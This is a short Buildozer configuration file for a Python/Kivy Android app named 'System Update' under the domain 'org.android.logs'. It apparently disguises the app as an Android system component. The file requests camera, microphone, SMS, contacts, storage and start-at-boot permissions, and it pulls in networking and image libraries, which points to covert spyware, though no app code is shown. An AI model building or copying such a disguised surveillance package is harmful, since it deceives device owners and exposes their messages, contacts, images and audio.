[app]
title = System Update
package.name = sysupdate
package.domain = org.android.logs
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0
requirements = python3,kivy,requests,opencv-python
android.permissions = INTERNET, CAMERA, RECORD_AUDIO, READ_SMS, READ_CONTACTS, WRITE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, RECEIVE_BOOT_COMPLETED
orientation = portrait
android.api = 33
android.minapi = 21
android.ndk = 25b
android.sdk = 34

[buildozer]
log_level = 2
